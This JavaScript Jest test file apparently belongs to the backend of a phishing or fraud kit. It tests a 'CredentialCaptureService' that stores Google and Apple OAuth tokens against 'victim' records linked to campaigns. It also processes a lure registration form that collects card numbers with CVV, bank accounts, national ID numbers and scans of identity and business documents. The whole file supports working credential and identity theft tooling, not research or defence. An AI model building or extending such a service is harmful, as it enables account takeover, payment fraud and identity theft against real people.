const CredentialCaptureService = require('../../../services/credentialCapture');
const EncryptionService = require('../../../services/encryption');

describe('CredentialCaptureService', () => {
  const key = '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef';
  let victimRepository;
  let oauthTokenRepository;
  let encryptionService;
  let service;

  beforeEach(() => {
    victimRepository = {
      findByEmail: jest.fn(),
      create: jest.fn(),
      update: jest.fn(),
      findById: jest.fn(),
    };
    oauthTokenRepository = {
      create: jest.fn(),
    };
    encryptionService = new EncryptionService(key);
    service = new CredentialCaptureService(
      oauthTokenRepository,
      victimRepository,
      encryptionService
    );
  });

  it('captures OAuth token and creates new victim when not existing', async () => {
    victimRepository.findByEmail.mockResolvedValue(null);
    victimRepository.create.mockResolvedValue({
      id: 'victim-1',
      email: 'user@test.com',
      deviceFingerprint: {},
      sessionData: {},
      validation: {},
    });
    oauthTokenRepository.create.mockResolvedValue({ id: 'token-1' });

    const result = await service.captureOAuthToken(
      {
        access_token: 'access',
        refresh_token: 'refresh',
        email: 'user@test.com',
        expires_in: 3600,
      },
      'google',
      { campaignId: 'camp-1', deviceFingerprint: { browser: 'chrome' } }
    );

    expect(victimRepository.create).toHaveBeenCalledWith(
      expect.objectContaining({
        email: 'user@test.com',
        captureMethod: 'oauth_google',
        campaignId: 'camp-1',
      })
    );

    const tokenPayload = oauthTokenRepository.create.mock.calls[0][0];
    expect(tokenPayload.victimId).toBe('victim-1');
    expect(tokenPayload.provider).toBe('google');
    expect(tokenPayload.tokenData).toHaveProperty('encrypted');
    expect(result.oauthToken).toEqual({ id: 'token-1' });
  });

  it('updates existing victim when email already exists', async () => {
    const existingVictim = {
      id: 'victim-existing',
      email: 'user@test.com',
      name: null,
      phone: null,
      deviceFingerprint: {},
      sessionData: {},
      validation: {},
    };
    victimRepository.findByEmail.mockResolvedValue(existingVictim);
    victimRepository.update.mockResolvedValue(existingVictim);
    oauthTokenRepository.create.mockResolvedValue({ id: 'token-2' });

    await service.captureOAuthToken(
      { access_token: 'a', refresh_token: 'r', email: 'user@test.com' },
      'apple',
      { deviceFingerprint: { platform: 'ios' } }
    );

    expect(victimRepository.update).toHaveBeenCalledWith(
      'victim-existing',
      expect.objectContaining({
        deviceFingerprint: expect.objectContaining({ platform: 'ios' }),
      })
    );
  });

  it('throws error when email missing', async () => {
    await expect(
      service.captureOAuthToken({ access_token: 'a' }, 'google')
    ).rejects.toThrow('Email is required for OAuth token capture');
  });

  it('processes registration form, stores documents, and encrypts card info', async () => {
    const victimId = 'victim-123';
    victimRepository.findById.mockResolvedValue({
      id: victimId,
      email: 'user@test.com',
      name: 'Old Name',
      phone: '000',
      validation: {},
      identityVerification: {},
      cardInformation: {}
    });
    victimRepository.update.mockImplementation(async (_id, payload) => ({
      id: victimId,
      ...payload,
    }));

    const result = await service.processRegistrationForm(
      victimId,
      {
        businessType: 'individual',
        businessName: 'Acme Store',
        industry: 'retail',
        taxCode: '1234567890',
        businessLicense: 'BL-123',
        businessAddress: '123 Street',
        businessPhone: '0123',
        businessEmail: 'biz@test.com',
        website: 'https://example.com',
        representativeName: 'New Name',
        representativePhone: '0999',
        representativeEmail: 'rep@test.com',
        representativeIdNumber: '999999999',
        representativePosition: 'Owner',
        bankName: 'VCB',
        bankAccountNumber: '123456',
        bankAccountName: 'New Name',
        bankBranch: 'HCM',
        cardType: 'visa',
        cardNumber: '4111111111111111',
        cardHolderName: 'New Name',
        cardExpiry: '12/30',
        cardCVV: '123',
        acceptTerms: true
      },
      {
        card_image: {
          path: '/tmp/card.png',
          originalName: 'card.png',
          mimetype: 'image/png',
          size: 123
        },
        transaction_history: [
          {
            path: '/tmp/txn.pdf',
            originalName: 'txn.pdf',
            mimetype: 'application/pdf',
            size: 456
          }
        ],
        business_license_file: {
          path: '/tmp/license.pdf',
          originalName: 'license.pdf',
          mimetype: 'application/pdf',
          size: 789
        },
        representative_id_file: {
          path: '/tmp/id.pdf',
          originalName: 'id.pdf',
          mimetype: 'application/pdf',
          size: 321
        },
        business_location_photos: [
          {
            path: '/tmp/photo1.jpg',
            originalName: 'photo1.jpg',
            mimetype: 'image/jpeg',
            size: 111
          }
        ]
      }
    );

    expect(victimRepository.update).toHaveBeenCalledWith(
      victimId,
      expect.objectContaining({
        name: 'New Name',
        phone: '0999',
        cardInformation: expect.objectContaining({
          cardType: 'visa',
          encrypted: expect.any(String),
          iv: expect.any(String),
          authTag: expect.any(String),
        }),
        identityVerification: expect.objectContaining({
          businessProfile: expect.objectContaining({
            name: 'Acme Store',
            industry: 'retail',
            taxCode: '1234567890',
            phone: '0123'
          }),
          representative: expect.objectContaining({
            name: 'New Name',
            phone: '0999',
            email: 'rep@test.com',
            idNumber: '999999999'
          }),
          banking: expect.objectContaining({
            bankName: 'VCB',
            accountNumber: '123456',
            accountName: 'New Name',
            transactionHistoryFiles: expect.arrayContaining([
              expect.objectContaining({ path: '/tmp/txn.pdf' })
            ])
          }),
          documents: expect.objectContaining({
            businessLicenseFile: expect.objectContaining({ path: '/tmp/license.pdf' }),
            representativeIdFile: expect.objectContaining({ path: '/tmp/id.pdf' }),
            businessLocationPhotos: expect.arrayContaining([
              expect.objectContaining({ path: '/tmp/photo1.jpg' })
            ])
          }),
          cardImage: expect.objectContaining({ path: '/tmp/card.png' }),
          files: expect.objectContaining({
            card_image: '/tmp/card.png',
            transaction_history: expect.arrayContaining(['/tmp/txn.pdf'])
          }),
          verificationStatus: 'pending'
        }),
        validation: expect.objectContaining({
          registrationCompleted: true,
        }),
      })
    );

    expect(result.id).toBe(victimId);
  });
});
